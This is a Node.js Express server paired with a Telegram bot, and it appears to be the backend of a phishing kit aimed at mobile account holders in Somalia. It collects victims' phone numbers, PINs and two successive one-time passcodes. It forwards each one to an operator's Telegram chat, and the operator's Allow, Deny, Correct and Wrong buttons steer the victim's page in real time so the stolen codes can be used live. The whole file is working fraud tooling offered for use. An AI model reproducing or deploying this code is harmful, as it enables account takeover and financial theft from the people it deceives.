const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- CONSTANTS --------------------
const COUNTRY = "Somalia";
const COUNTRY_CODE = "+252";

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- HELPERS --------------------
const getTime = () => new Date().toLocaleString('en-US', {
    month: 'numeric',
    day: 'numeric',
    year: 'numeric',
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric',
    hour12: true
});

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    if (typeof phone !== "string" || typeof pin !== "string" || !ADMIN_ID) {
        return res.status(400).json({ error: "Invalid data" });
    }

    statusStore[phone] = "pending";

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Country:</b> ${COUNTRY}
🌍 <b>Country Code:</b> ${COUNTRY_CODE}
📱 <b>Phone:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${getTime()}

━━━━━━━━━━━━━━━
⚠️ Waiting for approval`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    {
                        text: "✅ Allow",
                        callback_data: `approve|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}`
                    },
                    {
                        text: "❌ Deny",
                        callback_data: `deny|${encodeURIComponent(phone)}|${encodeURIComponent(pin)}`
                    }
                ]]
            }
        });

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- OTP 1 --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    if (!phone || !otp || !ADMIN_ID) {
        return res.status(400).json({ error: "Invalid data" });
    }

    try {
        await bot.telegram.sendMessage(ADMIN_ID,
            `1️⃣ FIRST OTP\n📱 ${phone}\n🔐 ${otp}\n⏰ ${getTime()}`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        {
                            text: "✅ Correct",
                            callback_data: `otp1|ok|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}`
                        },
                        {
                            text: "❌ Wrong",
                            callback_data: `otp1|bad|${encodeURIComponent(phone)}`
                        }
                    ]]
                }
            });

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- OTP 2 --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    if (!phone || !otp || !ADMIN_ID) {
        return res.status(400).json({ error: "Invalid data" });
    }

    try {
        await bot.telegram.sendMessage(ADMIN_ID,
            `2️⃣ SECOND OTP\n📱 ${phone}\n🔐 ${otp}\n⏰ ${getTime()}`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        {
                            text: "✅ Correct",
                            callback_data: `otp2|ok|${encodeURIComponent(phone)}|${encodeURIComponent(otp)}`
                        },
                        {
                            text: "❌ Wrong",
                            callback_data: `otp2|bad|${encodeURIComponent(phone)}`
                        }
                    ]]
                }
            });

        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);
    const pin = decodeURIComponent(ctx.match[2]);

    statusStore[phone] = "approved";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.reply(`✅ Approved\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

// DENY
bot.action(/deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);

    statusStore[phone] = "denied";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.reply(`❌ Denied\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

// OTP1 OK
bot.action(/otp1\|ok\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);

    statusStore[phone] = "otp1_ok";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.reply(`✅ OTP1 OK\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

// OTP1 BAD
bot.action(/otp1\|bad\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);

    statusStore[phone] = "otp1_bad";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.reply(`❌ OTP1 Wrong\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

// OTP2 OK
bot.action(/otp2\|ok\|(.+)\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);

    statusStore[phone] = "otp2_ok";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.reply(`✅ OTP2 OK\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

// OTP2 BAD
bot.action(/otp2\|bad\|(.+)/, async (ctx) => {
    const phone = decodeURIComponent(ctx.match[1]);

    statusStore[phone] = "otp2_bad";

    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.reply(`❌ OTP2 Wrong\n📱 ${phone}`);
    await ctx.answerCbQuery();
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- STATIC PAGES --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();

    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
(async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
})();

// -------------------- GRACEFUL STOP --------------------
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
